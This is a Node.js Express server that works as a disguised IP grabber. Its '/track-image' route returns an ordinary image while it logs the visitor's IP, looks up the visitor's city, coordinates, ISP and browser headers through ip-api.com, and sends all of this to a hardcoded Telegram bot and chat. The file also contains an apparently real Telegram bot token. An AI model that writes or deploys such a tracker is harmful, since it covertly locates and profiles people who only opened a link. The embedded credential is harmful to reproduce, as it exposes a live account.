const express = require("express");
const axios = require("axios");
const fs = require("fs");
const app = express();

// Heroku dynamically assigns port
const port = process.env.PORT || 3000;

// Telegram Bot details
const telegramBotToken = "8054463444:AAGU44U27Hly1LPgMqM2H_5fYwVQCbgLFME";
const telegramChatId = "1387832458";

// Route to capture maximum info
app.get("/track-image", async (req, res) => {
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
  console.log("Captured IP:", ip);
  const timestamp = new Date().toISOString();
  const log = `IP: ${ip} | Time: ${timestamp}\n`;

  // Log file (Heroku pe temporary hai)
  fs.appendFile("ip_logs.txt", log, (err) => {
    if (err) console.error("Error saving log:", err);
  });

  try {
    const response = await axios.get(`http://ip-api.com/json/${ip}`);
    console.log("API Response:", response.data);

    if (response.data.status === "fail") {
      throw new Error(`API failed: ${response.data.message}`);
    }

    const {
      country = "Unknown",
      countryCode = "Unknown",
      region = "Unknown",
      regionName = "Unknown",
      city = "Unknown",
      district = "Not Available",
      zip = "Not Available",
      lat = "Unknown",
      lon = "Unknown",
      timezone = "Unknown",
      isp = "Unknown",
      org = "Unknown",
      as = "Unknown",
    } = response.data;

    const userAgent = req.headers["user-agent"] || "Unknown";
    const language = req.headers["accept-language"] || "Unknown";
    const referer = req.headers["referer"] || "Direct Link";
    const connection = req.headers["connection"] || "Unknown";
    const host = req.headers["host"] || "Unknown";

    const detailedData = `
      IP Address: ${ip}
      Country: ${country} (${countryCode})
      State/Region: ${regionName} (${region})
      City: ${city}
      District: ${district}
      ZIP/Postal Code: ${zip}
      Latitude: ${lat}
      Longitude: ${lon}
      Timezone: ${timezone}
      ISP: ${isp}
      Organization: ${org}
      ASN: ${as}
      User-Agent: ${userAgent}
      Preferred Language: ${language}
      Referer: ${referer}
      Connection Type: ${connection}
      Host: ${host}
      Timestamp: ${timestamp}
    `;

    await axios.get(
      `https://api.telegram.org/bot${telegramBotToken}/sendMessage`,
      {
        params: {
          chat_id: telegramChatId,
          text: `New Visitor:\n${detailedData}`,
        },
      }
    );
  } catch (err) {
    console.error("Error:", err.message);
    await axios.get(
      `https://api.telegram.org/bot${telegramBotToken}/sendMessage`,
      {
        params: {
          chat_id: telegramChatId,
          text: `Error fetching info for IP: ${ip} - ${err.message}`,
        },
      }
    );
  }

  res.sendFile(__dirname + "/image.jpg");
});

app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});
